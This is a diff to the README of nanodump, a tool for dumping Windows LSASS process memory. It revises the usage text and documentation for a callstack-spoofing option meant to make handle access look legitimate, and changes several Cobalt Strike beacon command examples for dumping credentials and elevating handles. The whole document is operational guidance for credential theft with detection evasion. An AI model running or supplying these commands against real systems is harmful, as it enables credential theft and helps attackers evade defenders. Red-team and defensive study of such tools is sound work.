@@ -17,7 +17,7 @@ A flexible tool that creates a minidump of the LSASS process.
 <h2 id="usage">1. Usage</h2>
 
 ```
-usage: Z:\nanodump.x64.exe [--write C:\Windows\Temp\doc.docx] [--valid] [--duplicate] [--elevate-handle] [--duplicate-elevate] [--seclogon-leak-local] [--seclogon-leak-remote C:\Windows\notepad.exe] [--seclogon-duplicate] [--spoof-callstack svchost] [--silent-process-exit C:\Windows\Temp] [--shtinkering] [--fork] [--snapshot] [--getpid] [--help]
+usage: Z:\nanodump.x64.exe [--write C:\Windows\Temp\doc.docx] [--valid] [--duplicate] [--elevate-handle] [--duplicate-elevate] [--seclogon-leak-local] [--seclogon-leak-remote C:\Windows\notepad.exe] [--seclogon-duplicate] [--spoof-callstack] [--silent-process-exit C:\Windows\Temp] [--shtinkering] [--fork] [--snapshot] [--getpid] [--help]
 Dumpfile options:
     --write DUMP_PATH, -w DUMP_PATH
             filename of the dump
@@ -34,7 +34,7 @@ Obtain an LSASS handle via:
             leak an LSASS handle into another process via seclogon and duplicate it
     --seclogon-duplicate, -sd
             make seclogon open a handle to LSASS and duplicate it
-    --spoof-callstack {svchost,wmi,rpc}, -sc {svchost,wmi,rpc}
+    --spoof-callstack, -sc
             open a handle to LSASS using a fake calling stack
 Let WerFault.exe (instead of nanodump) create the dump
     --silent-process-exit DUMP_FOLDER, -spe DUMP_FOLDER
@@ -217,10 +217,8 @@ The dump will tipically be created under `C:\Windows\system32\config\systemprofi
 
 <h3>Spoof the callstack</h2>
 
-You can open a handle to LSASS with a fake callstack, this makes the function call look a bit more legitimate.  
-The offsets used in this feature, are only valid for Windows 10.0.19044.1706 (21h2), in other versions, the callstack might not look as expected. 
-You can spoof the callstack of svchost, wmi and rpc.  
-To access this feature, use the paramter `--spoof-callstack` with the values `svchost`, `wmi` or `rpc`.  
+You can open a handle to LSASS with a fake callstack, this makes the function call look a bit more legitimate (especially if run as BOF).  
+To access this feature, use the paramter `--spoof-callstack`.  
 
 <h2 id="combinations">3. Combining techniques</h2>
 
@@ -309,9 +307,9 @@ Make the WerFault.exe process create a full memory dump in the Temp folder:
 beacon> nanodump --werfault C:\Windows\Temp\
 ```
 
-Open a handle to LSASS with an invalid callstack and download the minidump with an invalid signature:
+Open a handle to LSASS with an spoofed callstack and download the minidump with an invalid signature:
 ```
-beacon> nanodump --spoof-callstack svchost
+beacon> nanodump --spoof-callstack
 ```
 
 Use the Shtinkering techinque:
@@ -329,9 +327,9 @@ Obtain a handle with low privs and elevate it using _elevate handle_:
 beacon> nanodump --elevate-handle
 ```
 
-Obtain a handle with low privs using a valid calling stack and elevate it using _elevate handle_:
+Obtain a handle with low privs using a spoofed callstack and elevate it using _elevate handle_:
 ```
-beacon> nanodump --elevate-handle --spoof-callstack rpc
+beacon> nanodump --elevate-handle --spoof-callstack
 ```
 
 Duplicate an existing low priv handle and elevate it using _elevate handle_:
